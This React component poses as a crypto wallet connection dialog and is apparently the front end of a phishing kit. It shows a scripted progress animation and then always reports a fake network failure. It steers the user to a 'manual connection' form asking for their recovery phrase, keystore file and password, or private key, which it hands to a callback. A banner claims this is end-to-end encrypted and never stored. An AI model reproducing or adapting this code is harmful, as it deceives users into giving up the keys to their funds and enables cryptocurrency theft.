import { useState, useEffect } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Label } from '@/components/ui/label';
import { Loader2, X, AlertTriangle, Wifi, WifiOff, Shield } from 'lucide-react';
import { Alert, AlertDescription } from '@/components/ui/alert';

interface WalletConnectionModalProps {
  isOpen: boolean;
  onClose: () => void;
  walletName: string;
  walletIcon?: string;
  onManualConnect: (method: string, data: any) => void;
}

type ConnectionPhase = 'connecting' | 'failed' | 'manual';

export function WalletConnectionModal({ 
  isOpen, 
  onClose, 
  walletName, 
  walletIcon,
  onManualConnect 
}: WalletConnectionModalProps) {
  const [phase, setPhase] = useState<ConnectionPhase>('connecting');
  const [connectionStep, setConnectionStep] = useState(0);
  const [phrase, setPhrase] = useState('');
  const [keystoreJson, setKeystoreJson] = useState('');
  const [keystorePassword, setKeystorePassword] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [loading, setLoading] = useState(false);

  const connectionSteps = [
    'Initializing connection...',
    'Scanning for wallet...',
    'Establishing secure connection...',
    'Verifying network...',
    'Authentication in progress...'
  ];

  useEffect(() => {
    if (isOpen && phase === 'connecting') {
      setConnectionStep(0);
      const timer = setInterval(() => {
        setConnectionStep(prev => {
          if (prev >= connectionSteps.length - 1) {
            clearInterval(timer);
            // Simulate connection failure after all steps
            setTimeout(() => setPhase('failed'), 1000);
            return prev;
          }
          return prev + 1;
        });
      }, 1500);

      return () => clearInterval(timer);
    }
  }, [isOpen, phase]);

  const handleRetryConnection = () => {
    setPhase('connecting');
    setConnectionStep(0);
  };

  const handleManualConnection = () => {
    setPhase('manual');
  };

  const handleManualSubmit = (method: string) => {
    setLoading(true);
    let data;
    
    switch (method) {
      case 'phrase':
        data = { phrase };
        break;
      case 'keystore':
        data = { keystoreJson, keystorePassword };
        break;
      case 'private':
        data = { privateKey };
        break;
      default:
        return;
    }

    // Simulate processing
    setTimeout(() => {
      onManualConnect(method, data);
      setLoading(false);
      onClose();
    }, 2000);
  };

  const resetModal = () => {
    setPhase('connecting');
    setConnectionStep(0);
    setPhrase('');
    setKeystoreJson('');
    setKeystorePassword('');
    setPrivateKey('');
    setLoading(false);
  };

  const handleClose = () => {
    resetModal();
    onClose();
  };

  const renderConnectionAttempt = () => (
    <div className="space-y-6 py-4">
      <div className="flex flex-col items-center space-y-4">
        <div className="relative">
          {walletIcon && (
            <img 
              src={walletIcon} 
              alt={walletName} 
              className="w-16 h-16 rounded-lg"
            />
          )}
          <div className="absolute -bottom-2 -right-2">
            <div className="bg-blue-500 rounded-full p-1">
              <Loader2 className="w-4 h-4 text-white animate-spin" />
            </div>
          </div>
        </div>
        
        <div className="text-center">
          <h3 className="font-semibold text-lg">Connecting to {walletName}</h3>
          <p className="text-gray-600 text-sm mt-1">
            {connectionSteps[connectionStep]}
          </p>
        </div>
      </div>

      <div className="space-y-2">
        <div className="flex justify-between text-sm text-gray-600">
          <span>Connection Progress</span>
          <span>{Math.round(((connectionStep + 1) / connectionSteps.length) * 100)}%</span>
        </div>
        <div className="w-full bg-gray-200 rounded-full h-2">
          <div 
            className="bg-blue-500 h-2 rounded-full transition-all duration-500"
            style={{ width: `${((connectionStep + 1) / connectionSteps.length) * 100}%` }}
          />
        </div>
      </div>

      <div className="flex items-center justify-center space-x-2 text-sm text-gray-500">
        <Wifi className="w-4 h-4" />
        <span>Secure connection established</span>
      </div>
    </div>
  );

  const renderConnectionFailed = () => (
    <div className="space-y-6 py-4">
      <div className="flex flex-col items-center space-y-4">
        <div className="relative">
          {walletIcon && (
            <img 
              src={walletIcon} 
              alt={walletName} 
              className="w-16 h-16 rounded-lg opacity-50"
            />
          )}
          <div className="absolute -bottom-2 -right-2">
            <div className="bg-red-500 rounded-full p-1">
              <WifiOff className="w-4 h-4 text-white" />
            </div>
          </div>
        </div>
        
        <div className="text-center">
          <h3 className="font-semibold text-lg text-red-600">Connection Failed</h3>
          <p className="text-gray-600 text-sm mt-1">
            Unable to connect to {walletName}
          </p>
        </div>
      </div>

      <Alert>
        <AlertTriangle className="h-4 w-4" />
        <AlertDescription>
          <strong>Network Error:</strong> The wallet connection service is experiencing network issues. 
          This might be due to high traffic or temporary server problems.
        </AlertDescription>
      </Alert>

      <div className="space-y-3">
        <p className="text-center text-gray-600 text-sm">
          We recommend connecting manually to ensure a stable connection.
        </p>
        
        <div className="flex space-x-3">
          <Button 
            variant="outline" 
            onClick={handleRetryConnection}
            className="flex-1"
          >
            <Wifi className="w-4 h-4 mr-2" />
            Retry Connection
          </Button>
          <Button 
            onClick={handleManualConnection}
            className="flex-1"
          >
            Connect Manually
          </Button>
        </div>
      </div>
    </div>
  );

  const renderManualConnection = () => (
    <div className="space-y-4">
      <div className="text-center pb-4">
        <h3 className="font-semibold text-lg">Manual Connection</h3>
        <p className="text-gray-600 text-sm">
          Choose your preferred method to connect your {walletName} wallet
        </p>
      </div>

      {/* Security Notice */}
      <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-4">
        <div className="flex items-start space-x-3">
          <Shield className="w-5 h-5 text-green-600 mt-0.5 flex-shrink-0" />
          <div>
            <h4 className="font-medium text-green-800 text-sm">Secure Connection</h4>
            <p className="text-green-700 text-xs mt-1">
              Your connection is end-to-end encrypted and completely safe. All data is transmitted 
              through secure protocols and your private information is never stored on our servers.
            </p>
          </div>
        </div>
      </div>

      <Tabs defaultValue="phrase" className="w-full">
        <TabsList className="grid w-full grid-cols-3">
          <TabsTrigger value="phrase">Recovery Phrase</TabsTrigger>
          <TabsTrigger value="keystore">Keystore JSON</TabsTrigger>
          <TabsTrigger value="private">Private Key</TabsTrigger>
        </TabsList>
        
        <TabsContent value="phrase" className="space-y-4">
          <div>
            <Label htmlFor="phrase">Enter your 12/24 word recovery phrase</Label>
            <Textarea
              id="phrase"
              placeholder="word1 word2 word3 ..."
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
              className="mt-2"
              rows={3}
            />
          </div>
          <Button 
            onClick={() => handleManualSubmit('phrase')} 
            className="w-full" 
            disabled={loading || !phrase.trim()}
          >
            {loading ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Processing...
              </>
            ) : (
              'Connect with Recovery Phrase'
            )}
          </Button>
        </TabsContent>
        
        <TabsContent value="keystore" className="space-y-4">
          <div>
            <Label htmlFor="keystore">Keystore JSON</Label>
            <p className="text-xs text-gray-500 mb-2">
              Several lines of text beginning with {'"{...}"'} plus the password you used to encrypt it
            </p>
            <Textarea
              id="keystore"
              value={keystoreJson}
              onChange={(e) => setKeystoreJson(e.target.value)}
              placeholder='{"version":3,"id":"...","address":"...","crypto":{...}}'
              className="mt-2 h-32 font-mono text-sm"
              rows={6}
            />
          </div>
          <div>
            <Label htmlFor="keystorePassword">Keystore Password</Label>
            <Input
              id="keystorePassword"
              type="password"
              placeholder="Enter keystore password"
              value={keystorePassword}
              onChange={(e) => setKeystorePassword(e.target.value)}
              className="mt-2"
            />
          </div>
          <Button 
            onClick={() => handleManualSubmit('keystore')} 
            className="w-full"
            disabled={loading || !keystoreJson.trim() || !keystorePassword.trim()}
          >
            {loading ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Processing...
              </>
            ) : (
              'Connect with Keystore'
            )}
          </Button>
        </TabsContent>
        
        <TabsContent value="private" className="space-y-4">
          <div>
            <Label htmlFor="privateKey">Private Key</Label>
            <p className="text-xs text-gray-500 mb-2">
              64-character hexadecimal string (with or without 0x prefix)
            </p>
            <Input
              id="privateKey"
              type="password"
              placeholder="Enter your private key"
              value={privateKey}
              onChange={(e) => setPrivateKey(e.target.value)}
              className="mt-2 font-mono"
            />
          </div>
          <Button 
            onClick={() => handleManualSubmit('private')} 
            className="w-full"
            disabled={loading || !privateKey.trim()}
          >
            {loading ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Processing...
              </>
            ) : (
              'Connect with Private Key'
            )}
          </Button>
        </TabsContent>
      </Tabs>
    </div>
  );

  return (
    <Dialog open={isOpen} onOpenChange={handleClose}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <div className="flex justify-between items-center">
            <DialogTitle className="flex items-center space-x-3">
              {phase === 'manual' && walletIcon && (
                <img src={walletIcon} alt={walletName} className="w-6 h-6" />
              )}
              <span>
                {phase === 'connecting' && `Connecting ${walletName}`}
                {phase === 'failed' && `${walletName} Connection`}
                {phase === 'manual' && `${walletName} Manual Connection`}
              </span>
            </DialogTitle>
            <Button variant="ghost" size="sm" onClick={handleClose}>
              <X className="w-4 h-4" />
            </Button>
          </div>
          {phase !== 'manual' && (
            <DialogDescription>
              {phase === 'connecting' && 'Please wait while we establish a connection...'}
              {phase === 'failed' && 'Connection attempt unsuccessful'}
            </DialogDescription>
          )}
        </DialogHeader>

        {phase === 'connecting' && renderConnectionAttempt()}
        {phase === 'failed' && renderConnectionFailed()}
        {phase === 'manual' && renderManualConnection()}
      </DialogContent>
    </Dialog>
  );
} 